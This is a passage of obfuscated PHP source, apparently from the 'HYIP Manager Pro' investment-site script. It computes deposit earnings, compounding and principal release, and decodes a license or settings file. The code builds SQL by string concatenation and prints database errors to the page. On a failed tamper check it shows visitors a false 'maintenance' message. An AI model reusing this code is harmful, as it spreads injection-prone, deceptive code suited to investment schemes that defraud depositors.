              elnlcokeap ($elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']], $elnlcGGMmt, 'date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcJwrG . ' ' . $elnlcRIyyJ . ' where id =' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
      {
        $q = 'select * from hm2_types where q_days > 0 and pay_by_button != 1';
      }
      else
      {
        $q = 'select * from hm2_types where q_days > 0';
      }

      $elnlchGkPU = mysql_query ($q);
      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
      {
        $elnlcLdJkx = $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] + $elnlcCgqPK[$elnlcsyENS['elnlcxfih']] - (0 < $elnlcCgqPK[delay] ? 1 : 0);
        $elnlckapu = $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
        if ($elnlcCgqPK[$elnlcsyENS['elnlcRupg']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlckapu . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcTVzDu . ' and 
                (deposit_date + interval ' . $elnlcLdJkx . ' ' . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcLdJkx . ' ') . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ('' . ' < now()) and
                ((' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' = 0) || (' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' && (deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcOhgyp']] . ' ') . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlcjSNE = mysql_query ($q);
          while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
          {
            $elnlcDBLq = $elnlcUpbus[$elnlcsyENS['elnlcAwVw']];
            $elnlclzICL = 'Deposit return';
            if ($elnlcCgqPK[$elnlcsyENS['elnlcmbit']] != 0)
            {
              $elnlcDBLq = floor ($elnlcUpbus[$elnlcsyENS['elnlcAwVw']] * (100 - $elnlcCgqPK[$elnlcsyENS['elnlcmbit']])) / 100;
              $elnlclzICL = '' . 'Deposit return. ' . $elnlcCgqPK[$elnlcsyENS['elnlcmbit']] . '% holded.';
            }

            $q = 'insert into hm2_history set
                user_id = ' . $elnlcUpbus[$elnlcsyENS['elnlcAvUq']] . ',
      		amount = ' . $elnlcDBLq . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcDBLq . ',
                ec = ' . $elnlcUpbus[$elnlcsyENS['elnlcyqyS']] . ',
      		date = \'' . $elnlcUpbus[$elnlcsyENS['elnlcrLdHj']] . ('' . '\' + interval ' . $elnlcLdJkx . ' ') . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlcUpbus[$elnlcsyENS['elnlcLbvLL']] . ('' . ',
                description = \'' . $elnlclzICL . '\'');
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcTVzDu . ' and 
    	       (deposit_date + interval ' . $elnlcLdJkx . ' ' . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcLdJkx . ' ') . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ('' . ' < now()) and
             ((' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' = 0) || (' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' && (deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcOhgyp']] . ' ') . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlckapu . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }

      flock ($elnlcKvqEM, LOCK_UN);
      fclose ($elnlcKvqEM);
      unlink ('' . './tmpl_c/lock_user' . $elnlcTVzDu);
    }

  }

  function elnlcrkdr ($elnlcHmVi)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    $elnlcWBLE = array ();
    if (($elnlcSuVc[$elnlcsyENS['elnlcmPmuG']] == 1 AND $elnlcHmVi != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcbViuH']]][$elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]] = $elnlcCgqPK;
    }

    $elnlclOSA = $elnlcsyENS['elnlctNxTK'];
    $elnlconLWC = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcHmVi == -1)
    {
      $elnlconLWC = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcHmVi . ' and status = \'on\'';
    }

    if ($elnlcHmVi == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlckfIs = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCKDFD = mysql_fetch_array ($elnlckfIs))
    {
      $elnlcTVzDu = $elnlcCKDFD[$elnlcsyENS['elnlcLbvLL']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcTVzDu;
      (mysql_query ($q) OR print mysql_error ());
      $elnlclOSA = $elnlcsyENS['elnlctNxTK'];
      while (0 < $elnlclOSA)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcTVzDu . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / (60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
        $elnlclOSA = $elnlcsyENS['elnlcmjUx'];
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          ++$elnlclOSA;
          if (!isset ($elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]]))
          {
            continue;
          }

          $elnlcTjnV = $elnlcsyENS['elnlcmjUx'];
          $elnlcyvqy = $elnlcsyENS['elnlcmjUx'];
          reset ($elnlcWBLE);
          reset ($elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]]);
          while (list ($elnlcxHGyw, $elnlcRdog) = each ($elnlcWBLE[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]]))
          {
            if (($elnlcRdog[$elnlcsyENS['elnlcwFTQ']] <= $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] AND ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] <= $elnlcRdog[$elnlcsyENS['elnlcMFyGk']] OR $elnlcRdog[$elnlcsyENS['elnlcMFyGk']] == 0)))
            {
              $elnlcTjnV = $elnlcRdog[$elnlcsyENS['elnlcOhvjC']];
            }

            if (($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] < $elnlcRdog[$elnlcsyENS['elnlcwFTQ']] AND $elnlcTjnV == 0))
            {
              $elnlcTjnV = $elnlcyvqy;
            }

            if (($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] < $elnlcRdog[$elnlcsyENS['elnlcwFTQ']] AND 0 < $elnlcTjnV))
            {
              break;
            }

            $elnlcyvqy = $elnlcRdog[$elnlcsyENS['elnlcOhvjC']];
          }

          if (($elnlcRdog[$elnlcsyENS['elnlcMFyGk']] != 0 AND $elnlcRdog[$elnlcsyENS['elnlcMFyGk']] < $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']]))
          {
            $elnlcTjnV = $elnlcyvqy;
          }

          $elnlcGGMmt = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] * $elnlcTjnV / 100;
          $elnlcJwrG = '';
          if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcaeKEf'])
          {
            $elnlcJwrG = ' 1 day ';
          }
          else
          {
            if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'])
            {
              $elnlcJwrG = ' 1 hour ';
            }
            else
            {
              if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcwGlL'])
              {
                $elnlcJwrG = ' 7 day ';
              }
              else
              {
                if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == 'b-w')
                {
                  $elnlcJwrG = ' 14 day ';
                }
                else
                {
                  if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcGPcC'])
                  {
                    $elnlcJwrG = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlczdyU'])
                    {
                      $elnlcJwrG = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlczdOP'])
                      {
                        $elnlcJwrG = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcwbAEV'])
                        {
                          $elnlcJwrG = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcclPO'])
                          {
                            $elnlcJwrG = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcBEDou'])
                            {
                              $elnlcJwrG = ' ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcTjnV == 0 AND $elnlcJwrG == ''))
          {
            continue;
          }

          $elnlcOWWAf = -1;
          $q = 'select weekday(\'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ') as dw');
          ($elnlcSrlye = mysql_query ($q) OR print mysql_error ());
          while ($elnlcggjo = mysql_fetch_array ($elnlcSrlye))
          {
            $elnlcOWWAf = $elnlcggjo[$elnlcsyENS['elnlccblu']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcQcSG'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ') and ')) . ' deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
          ($elnlcqTHnf = mysql_query ($q) OR print mysql_error ());
          $elnlciliCo = $elnlcsyENS['elnlcmjUx'];
          while ($elnlcngDEl = mysql_fetch_array ($elnlcqTHnf))
          {
            $elnlciliCo = $elnlcngDEl[$elnlcsyENS['elnlckNCf']];
          }

          if ($elnlciliCo == 0)
          {
            if ((5 <= $elnlcOWWAf AND $elnlcCgqPK[$elnlcsyENS['elnlcqCEH']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcOWWAf == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                    ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ('' . ',
                    amount = ' . $elnlcGGMmt . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcSuVc[$elnlcsyENS['elnlcypSu']] . number_format ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']], 2) . ('' . ' - ' . $elnlcTjnV . ' %\',
                    actual_amount = ' . $elnlcGGMmt . ',
                    date = \'') . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                    ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
            }
          }

          (mysql_query ($q) OR print mysql_error ());
          $elnlcRIyyJ = '';
          if ($elnlcCgqPK[$elnlcsyENS['elnlcdryi']] == $elnlcsyENS['elnlcBEDou'])
          {
            if (($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] == 0 OR ($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] AND $elnlcCgqPK[$elnlcsyENS['elnlccNEL']])))
            {
              $elnlcRIyyJ = ', status = \'off\'';
            }

            if (($elnlcCgqPK[$elnlcsyENS['elnlcRupg']] == 1 AND ($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] == 0 OR ($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] AND $elnlcCgqPK[$elnlcsyENS['elnlccNEL']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
                    amount = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] . ',
                    ec = ' . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                    deposit_id = ') . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcOWWAf AND $elnlcCgqPK[$elnlcsyENS['elnlcqCEH']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] AND $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] <= 100) AND $elnlcCgqPK[$elnlcsyENS['elnlcvNkQ']] == 1))
              {
                if ($elnlcCgqPK[$elnlcsyENS['elnlcdzAd']] == 0)
                {
                  $elnlcCgqPK[$elnlcsyENS['elnlcdzAd']] = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] + 1;
                }

                if (($elnlcCgqPK[$elnlcsyENS['elnlcqQISr']] <= $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] AND $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] <= $elnlcCgqPK[$elnlcsyENS['elnlcdzAd']]))
                {
                  if ($elnlcCgqPK[$elnlcsyENS['elnlcDxJb']] == 1)
                  {
                    $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcCgqPK[$elnlcsyENS['elnlcDexfh']]);
                    if (!in_array ($elnlcCgqPK[$elnlcsyENS['elnlccdExO']], $elnlcnGUUn))
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcnGUUn[0];
                    }
                  }
                  else
                  {
                    if ($elnlcCgqPK[$elnlcsyENS['elnlccdExO']] < $elnlcCgqPK[$elnlcsyENS['elnlcORJuw']])
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcCgqPK[$elnlcsyENS['elnlcORJuw']];
                    }

                    if ($elnlcCgqPK[$elnlcsyENS['elnlcyDBs']] < $elnlcCgqPK[$elnlcsyENS['elnlccdExO']])
                    {
                      $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcCgqPK[$elnlcsyENS['elnlcyDBs']];
                    }
                  }
                }
                else
                {
                  $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] = $elnlcsyENS['elnlcmjUx'];
                }

                if ((0 < $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] AND $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] <= 100))
                {
                  $elnlczCfN = $elnlcGGMmt * $elnlcCgqPK[$elnlcsyENS['elnlccdExO']] / 100;
                  $elnlcGGMmt = floor ((floor ($elnlcGGMmt * 100000) / 100000 - floor ($elnlczCfN * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ('' . ',
                        amount = -' . $elnlczCfN . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlczCfN . ',
                    		ec = ') . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ',
                    		date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG . ',
                                deposit_id = ') . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlczCfN . ',
                    		actual_amount = actual_amount + ' . $elnlczCfN . '
                    		where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlcokeap ($elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']], $elnlcGGMmt, 'date = \'' . $elnlcCgqPK[$elnlcsyENS['elnlctKJt']] . ('' . '\' + interval ' . $elnlcJwrG));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcJwrG . ' ' . $elnlcRIyyJ . ' where id =' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlchGkPU = mysql_query ($q);
      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
      {
        $elnlcLdJkx = $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] + $elnlcCgqPK[$elnlcsyENS['elnlcxfih']] - (0 < $elnlcCgqPK[$elnlcsyENS['elnlcxfih']] ? 1 : 0);
        $elnlckapu = $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
        if ($elnlcCgqPK[$elnlcsyENS['elnlcRupg']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlckapu . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcTVzDu . ' and 
                (deposit_date + interval ' . $elnlcLdJkx . ' day < last_pay_date or deposit_date + interval ' . $elnlcLdJkx . ' day < now()) and
                ((' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' = 0) || (' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' && (deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcOhgyp']] . ' day < now())))
             ';
          $elnlcjSNE = mysql_query ($q);
          while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlcUpbus[$elnlcsyENS['elnlcAvUq']] . ',
      		amount = ' . $elnlcUpbus[$elnlcsyENS['elnlcAwVw']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcUpbus[$elnlcsyENS['elnlcAwVw']] . ',
                      ec = ' . $elnlcUpbus[$elnlcsyENS['elnlcyqyS']] . ',
      		date = \'' . $elnlcUpbus[$elnlcsyENS['elnlcrLdHj']] . ('' . '\' + interval ' . $elnlcLdJkx . ' day,
                      deposit_id = ') . $elnlcUpbus[$elnlcsyENS['elnlcLbvLL']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcTVzDu . ' and 
    	       (deposit_date + interval ' . $elnlcLdJkx . ' day < last_pay_date or deposit_date + interval ' . $elnlcLdJkx . ' day < now()) and
             ((' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' = 0) || (' . $elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] . ' && (deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcOhgyp']] . ' day < now()))) and
             type_id = ' . $elnlckapu . '
           ';
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlcrzrlk ($a)
  {
    global $elnlcsyENS;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    if (!file_exists ('settings.php'))
    {
      return array ();
    }

    $elnlcRIwA = file ($elnlcsyENS['elnlcTpwE']);
    $t = chop ($elnlcRIwA[1]);
    $elnlcIUUJq = strlen ($t) / 2;
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($t); $i += 2)
    {
      $d[$i / 2] = substr ($t, $i, 2);
      $d[$i / 2] = chr (hexdec ($d[$i / 2]) ^ 65);
    }

    $k = '';
    $elnlcpltP = elnlcunsna (0, $elnlcIUUJq, $d);
    $j = $elnlcIUUJq;
    while (10 < $j)
    {
      $elnlcpltP = elnlcunsna ($elnlcpltP, $elnlcIUUJq, $d);
      $k .= $d[$elnlcpltP];
      $d[$elnlcpltP] = -1;
      --$j;
    }

    $z = chr (1) . chr (1) . chr (1);
    list ($k, $z) = mb_split ('' . $z, $k, 2);
    list ($elnlcgpbje, $elnlcHIABx, $k) = mb_split (':', $k, 3);
    if ($elnlcgpbje != md5 ($k))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    if ($elnlcHIABx = !md5 ($elnlcgpbje . $elnlcoFEhc))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    $z = unserialize ($k);
    $z[time_dif] = sprintf ('%d', $z[$elnlcsyENS['elnlcjWWW']]);
    $elnlcdRCR = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcsyENS['elnlctqSz']);
    $z[$elnlcsyENS['elnlcFmlPF']] = $elnlcdRCR[$z[$elnlcsyENS['elnlctKGif']] - 1];
    if ($z[$elnlcsyENS['elnlcQrUC']] == 1)
    {
      $z[$elnlcsyENS['elnlcWILb']] = sprintf ('%d', (time () - mktime (0, 0, 0, $z[$elnlcsyENS['elnlctKGif']], $z[$elnlcsyENS['elnlcAywNv']], $z[$elnlcsyENS['elnlcArER']])) / 86400);
    }

    $z[$elnlcsyENS['elnlcFAnDP']] = ($z[$elnlcsyENS['elnlcwUhyW']] ? 1 : 0);
    $z[$elnlcsyENS['elnlcJBln']] = $z[$elnlcsyENS['elnlcHJpI']];
    return $z;
  }

  function elnlcrfbia ()
  {
    global $elnlcsyENS;
    $elnlcMITL = $elnlcsyENS['elnlcmjUx'];
    if (file_exists ('./tmpl_c/.htdata'))
    {
      $elnlcMITL = $elnlcsyENS['elnlctNxTK'];
    }

    $s = array ();
    $elnlcRIwA = fopen ($elnlcsyENS['elnlcHFtK'], $elnlcsyENS['elnlcJovb']);
    if ($elnlcRIwA)
    {
      while ($elnlccktRA = fgets ($elnlcRIwA, 20000))
      {
        $elnlccktRA = chop ($elnlccktRA);
        if (($elnlccktRA != '<?/*' AND $elnlccktRA != '*/?>'))
        {
          $elnlcuwppG = $elnlcOBJb = '';
          list ($elnlcuwppG, $elnlcOBJb) = @split ('	', $elnlccktRA, 2);
          if (((preg_match ('/^key|^cnf/', $elnlcuwppG) AND $elnlcMITL == 1) OR $elnlcMITL == 0))
          {
            $s[$elnlcuwppG] = $elnlcOBJb;
            continue;
          }

          continue;
        }
      }
    }

    fclose ($elnlcRIwA);
    if ($elnlcMITL == 1)
    {
      list ($elnlccktRA, $elnlcIVqny) = file ($elnlcsyENS['elnlcTFCww']);
      $elnlcTCRD = $elnlccktRA;
      $elnlcGhNCz = $elnlcsyENS['elnlcmjUx'];
      for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($elnlcTCRD); $i += 5)
      {
        $elnlcGhNCz += hexdec (substr ($elnlcTCRD, $i, 5));
      }

      if ($s[$elnlcsyENS['elnlcuQMv']] != $elnlcGhNCz * 15)
      {
        print '<!-- Settings are broken. Please e-mail to script developers as soon as possible -->';
        print 'System maintenance and hardware upgrades.';
        exit ();
      }

      $elnlccktRA = elnlcsajtj ($elnlccktRA, $s[$elnlcsyENS['elnlcgmuy']]);
      $elnlcDbaU = split ('
', $elnlccktRA);
      for ($i = $elnlcsyENS['elnlcmjUx']; $i < sizeof ($elnlcDbaU); ++$i)
      {
        list ($elnlcuwppG, $elnlcOBJb) = split ('	', $elnlcDbaU[$i], 2);
        $s[$elnlcuwppG] = $elnlcOBJb;
      }
    }

    $elnlcdRCR = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcsyENS['elnlctqSz']);
    $s[$elnlcsyENS['elnlcFmlPF']] = $elnlcdRCR[$s[$elnlcsyENS['elnlctKGif']] - 1];
    if ($s[$elnlcsyENS['elnlcQrUC']] == 1)
    {
      $s[$elnlcsyENS['elnlcWILb']] = sprintf ('%d', (time () - mktime (0, 0, 0, $s[$elnlcsyENS['elnlctKGif']], $s[$elnlcsyENS['elnlcAywNv']], $s[$elnlcsyENS['elnlcArER']])) / 86400);
    }

    $s[$elnlcsyENS['elnlcjWWW']] = sprintf ('%d', $s[$elnlcsyENS['elnlcjWWW']]);
    $s[$elnlcsyENS['elnlcFAnDP']] = ($s[$elnlcsyENS['elnlcwUhyW']] ? 1 : 0);
    $s[$elnlcsyENS['elnlcJBln']] = $s[$elnlcsyENS['elnlcHJpI']];
    return $s;
  }

  function elnlchkyoa ($a)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    $elnlcoFEhc = serialize ($elnlcSuVc);
    $elnlcgpbje = md5 ($elnlcoFEhc);
